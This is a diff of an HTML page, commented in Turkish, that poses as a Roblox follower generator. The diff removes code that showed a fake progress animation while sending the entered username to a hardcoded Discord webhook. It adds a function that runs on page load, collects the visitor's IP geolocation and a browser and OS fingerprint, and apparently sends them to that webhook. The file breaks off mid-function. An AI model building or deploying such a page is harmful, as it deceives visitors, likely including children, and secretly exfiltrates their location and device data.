@@ -1,6 +1,3 @@
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -135,7 +132,7 @@
 
         .progress-container {
             margin-top: 20px;
-            display: none; /* Initially hidden */
+            display: none;
         }
         .progress-bar {
             width: 100%;
@@ -201,46 +198,27 @@
         </main>
     </div>
 
-<!-- TAM VE EKSİKSİZ JAVASCRIPT KODU BURADA BAŞLIYOR -->
+<!-- EN ÖNEMLİ KISIM: JAVASCRIPT -->
 <script>
     // Discord Webhook URL'niz
     const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-    // Form elemanlarını seçelim
-    const form = document.getElementById('followerForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const progressContainer = document.getElementById('progressContainer');
-    const progressFill = document.getElementById('progressFill');
-    const statusMessage = document.getElementById('statusMessage');
-
-    // Form gönderildiğinde çalışacak fonksiyon
-    form.addEventListener('submit', async function(event) {
-        // Sayfanın yenilenmesini engelle
-        event.preventDefault();
-
-        // Roblox kullanıcı adını al
-        const username = document.getElementById('robloxUsername').value;
-        const followerAmount = document.getElementById('followerAmount').value;
-
-        // Butonu devre dışı bırak ve ilerleme çubuğunu göster
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Processing...';
-        progressContainer.style.display = 'block';
-        progressFill.style.width = '0%';
-        statusMessage.textContent = 'Connecting to server...';
-
-        // Sahte ilerleme animasyonu
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += 10;
-            progressFill.style.width = progress + '%';
-            if (progress === 30) statusMessage.textContent = 'Verifying user...';
-            if (progress === 60) statusMessage.textContent = `Generating ${followerAmount} followers...`;
-            if (progress === 90) statusMessage.textContent = 'Almost done...';
-        }, 400);
-
-        // Arka planda veri toplama ve gönderme işlemini başlat
-        await sendUserDataToDiscord(username);
-
-        // Animasyonu bitir ve başarı mesajını göster
-        setTimeout(()
+    // --- 1. BÜTÜN BİLGİLERİ TOPLAYIP GÖNDEREN FONKSİYON ---
+    // Bu fonksiyon sayfa açıldığında bir kere çalışır.
+    async function sendAllInfo() {
+        try {
+            const geoReq = await fetch('https://ipapi.co/json/');
+            const g = await geoReq.json();
+            let browser = "Unknown";
+            let os = "Unknown Platform";
+            const ua = navigator.userAgent;
+            if (ua.includes("Edg/")) browser = "Microsoft Edge";
+            else if (ua.includes("Brave")) browser = "Brave";
+            else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
+            else if (ua.includes("Chrome")) browser = "Google Chrome";
+            else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+            else if (ua.includes("Safari")) browser = "Safari";
+            if (navigator.userAgentData) {
+                const platformInfo = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
+                if (navigator.userAgentData.platform === "Windows") {
+                    const
